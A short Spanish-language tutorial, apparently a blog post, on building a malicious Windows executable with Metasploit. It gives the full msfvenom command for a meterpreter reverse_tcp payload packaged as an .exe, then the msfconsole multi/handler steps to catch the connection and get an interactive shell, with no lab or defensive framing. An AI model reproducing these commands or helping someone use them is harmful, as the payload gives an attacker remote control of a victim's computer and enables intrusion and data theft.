Cómo hacer un ejecutable malicioso con metasploit



En este artículo aprenderemos como hacer un ejecutable malicioso con metasploit para windows

1-Crear el exploit con msfvenom.

Para ello tenemos que ejecutar el siguiente comando sustituyendo los campos en mayúscula:

msfvenom -p windows/meterpreter/reverse_tcp -f exe lhost=HOST lport=PORT -o output_file.exe

2-Inicar la consola de metasploit.

Para ello ejecutaremos el siguiente comando: msfconsole -q

3-Setear el exploit.

Para ello ejecutamos el siguiente comando: use exploit/multi/handler

4-Setear el payload.

Para ello ejecutamos el siguiente comando: set payload windows/meterpreter/reverse_tcp

5-Setear las opciones.

Para ello ejeutaremos los siguientes comandos:

set lport PORT y set lhost HOST

1-Iniciar el exploit junto con el listener.

Para ello escribimos:

exploit o run


Recordad que también podéis crear vuestro propio listener, para ver la ayuda puedes poner el comando help y para tener una shell interactiva puedes usar el comando shell.
